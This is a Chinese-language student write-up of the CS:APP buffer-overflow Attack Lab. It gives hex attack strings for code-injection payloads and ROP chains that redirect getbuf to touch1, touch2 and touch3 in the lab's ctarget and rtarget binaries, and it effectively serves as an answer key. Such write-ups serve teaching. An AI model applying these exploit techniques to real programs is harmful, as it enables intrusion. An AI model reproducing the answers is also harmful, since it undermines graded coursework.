/*
缓冲区溢出攻击的相关实验。
总共5个phase，前三个通过注入代码，即利用缓冲区溢出返回touch1，touch2，touch3的位置，后两个加大了难度，通过对程序中现有的汇编指令组合完成攻击。
*/


###phase_1
提供的ctarget文件会执行test函数，test函数中会调用getbuf函数，在getbuf中通过输入超过开辟的栈大小的字符串，
让getbuf结束后不返回test函数，而是执行touch1函数，其实就是通过溢出覆盖掉getbuf的返回地址，由test修改为touch1。

先看汇编代码：
/* getbuf */
00000000004017a8 <getbuf>:
  4017a8:  48 83 ec 28            sub    $0x28,%rsp
  4017ac:  48 89 e7               mov    %rsp,%rdi
  4017af:  e8 8c 02 00 00         callq  401a40 <Gets>
  4017b4:  b8 01 00 00 00         mov    $0x1,%eax
  4017b9:  48 83 c4 28            add    $0x28,%rsp
  4017bd:  c3                     retq   
  4017be:  90                     nop
  4017bf:  90                     nop
  
  /* touch1 */
  00000000004017c0 <touch1>:
  4017c0:  48 83 ec 08            sub    $0x8,%rsp
  4017c4:  c7 05 0e 2d 20 00 01   movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
由上知，getbuf会开辟一个大小为0x28的空间，后面跟着的就是返回地址，所以我们只要输入一个大于0x28的字符串，让其覆盖掉返回地址即可，
所以得出攻击字符串如下：
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
/* 0x28个字符 */
c0 17 40 00
/* 小端，touch1的地址 */
将其通过提供的hex2raw转换为机器码并输入，结果如下：
csapp/csapp/target1$ ./hex2raw <ctarget11 > ctarget12
csapp/csapp/target1$ ./ctarget -qi ctarget12
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id  bovik
  course  15213-f15
  lab  attacklab
  result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 

###phase_2
相比phase_1,touch2多了一个入参，要求这个参数等于提供的cookie。
同理，依然是首先找到touch2的地址，用于返回。其次，要输入参数，那么要把cookie放入%rdi寄存器当中。
综上，我们需要的执行步骤就是，1、将getbuf的返回地址指向需要执行的代码，此段代码用于将cookie放入%rdi，然后将touch2的地址压入栈中，
在执行完这一段代码之后即可执行touch2。
movq $0x59b997fa,%rdi
pushq 0x4017ec
ret
/* $0x59b997fa为cookie值，0x4017ec为touch2的地址 */
将上面的汇编代码翻译成二进制指令，返回地址指向%rsp，通过GDB分析，可以得到getbuf时的rsp的值为：0x5561dc78.

综上，最后输入如下：
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
/* 注入的代码 */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
/* 填满40个字符 */
78 dc 61 55
/* getbuf的栈顶位置，其覆盖掉返回地址 */
和phase_1同样的方法输入即可。

###phase_3
和touch2不同的是，touch3的输入是cha*，也就是说要输入的是一个字符串。那必须解决的一个问题就是将字符串放在哪里？
因为调用完后会释放掉getbuf的栈，那么如果说放在getbuf栈中，会被后续的touch3中的函数覆盖，所以就将其放在调用getbuf的函数test的栈中，
之前我们已经知道getbuf的栈顶是5561dc78，而getbuf申请了0x28的空间，那么test的栈顶位置就是0x5561dc78+0x28=0x5561dca0，
然后再往回退一个返回地址的位置，所以就应该在0x5561dca8的位置上插入我们要放入的字符串，总体来说应该是如下的情况：

所以最后注入的代码由以下几部分组成：
 注入的代码
movq 0x5561dca8,%rdi
pushq 0x4018fa
ret
/* $0x5561dca8为存放cookie字符串的起始位置，0x4018fa为touch3的地址 */
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
/* 翻译 */
最后输入为：
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
/* 注入的代码 */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
/* 填满40个字符 */
78 dc 61 55 00 00 00 00
/* getbuf的栈顶位置，其覆盖掉返回地址 */
35 39 62 39 39 37 66 61 00
/* cookie的ascii码*/
和phase_1同样方式输入即可。

###phase_4
phase_4就是和phase_2的目的一样，但是rtarget在编译时引入了栈随机化和栈只可读来防止攻击，这样就不能通过在栈上放入代码的方式来攻击了，
而且也不知道栈的地址。所以要使用ROP(Return-oriented Programming),基于代码复用技术的攻击，
意思就是从已有的可执行文件中提取指令片段，构建代码。
所以首先确定，完成目标需要的指令是什么？
movq $0x59b997fa,%rdi
pushq 0x4017ec
ret
/* $0x59b997fa为cookie值，0x4017ec为touch2的地址 */
如上代码在可执行文件中是不会有的，尤其是movq $0x59b997fa,%rdi这一句，所以采用的方法是将$0x59b997fa放入栈中，
然后使用指令popq将其弹出到寄存器rax中，再将其放到rdi中，执行touch2即可。

寻找代码片段过程略，最后输入字符串为就是：
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
/* 先输入40个字符 */
ab 19 40 00 00 00 00 00
/*  在地址0x4019ab对应的汇编代码如下 */
/*   popq %rax  */
/*    ret  */
fa 97 b9 59 00 00 00 00
/*   在此处放入cookie，用于上一条指令的pop，上一条指令执行时 */
/*   此为栈顶，pop将其谈到rax中 */
a2 19 40 00 00 00 00 00
/* 对应汇编代码为 movq %rax,%rdi ret */
ec 17 40 00 00 00 00 00
/* touch2的地址 */
整个流程就相当于执行了如下指令：
popq %rax
movq %rax %rdi
然后再执行touch2即可完成。
注意90代表nop，填充用的，可以忽略。

###phase_5
就是把phase_3再做一遍，但是有一个问题，就是现在栈是随机化的，所以没办法先确定地址，只能通过栈顶地址加随机偏移量来确定字符串的起始地址。
所以按照如下步骤来：
获取rsp的地址
获取字符串的偏移量(往后放，不能直接跟在后面，字符串的值无法执行)
将两者的和给rdi
调用touch3
寻找rsp的值
找到指令movq %rsp,%rax，位置是0x401a06，即可取得rsp的位置。
获取偏移量
找到指令add，在代码中的0x4019d8，为add al 0x37，所以偏移量就是0x37.
和给rdi
将rax的值给rdi，寻找到movq %rax ，%rdi，之前找过，就是0x4019a2.
调用touch3

所以最后的输入为，和phase_1同样方式输入即可。
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
/* 填充40个字符 */
06 1a 40 00 00 00 00 00
/*调用movq %rsp,%rax*/
d8 19 40 00 00 00 00 00
/*调用add al 0x37 */
a2 19 40 00 00 00 00 00
/*调用movq %rax ，%rdi*/
fa 18 40 00 00 00 00 00
/*调用touc3 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 
/* 填充0x37个偏移 */
35 39 62 39 39 37 66 61 00
/* 写入cookie*/